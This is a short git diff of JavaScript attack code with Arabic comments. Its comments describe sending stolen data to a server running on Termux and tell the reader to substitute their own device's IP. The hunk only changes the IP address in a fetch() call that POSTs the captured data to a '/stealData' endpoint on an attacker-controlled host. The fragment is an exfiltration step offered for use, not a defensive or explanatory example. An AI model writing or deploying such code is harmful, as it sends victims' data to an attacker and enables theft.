@@ -11,7 +11,7 @@
         .then(data => {
             // إرسال البيانات المسروقة إلى الخادم الذي يعمل على Termux
             console.log("Data received:", data);
-            fetch('http://10.21.52.111:3000/stealData', { // استبدل <YOUR_TERMUX_IP> بعنوان جهازك
+            fetch('http://10.2.0.2:3000/stealData', { // استبدل <YOUR_TERMUX_IP> بعنوان جهازك
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
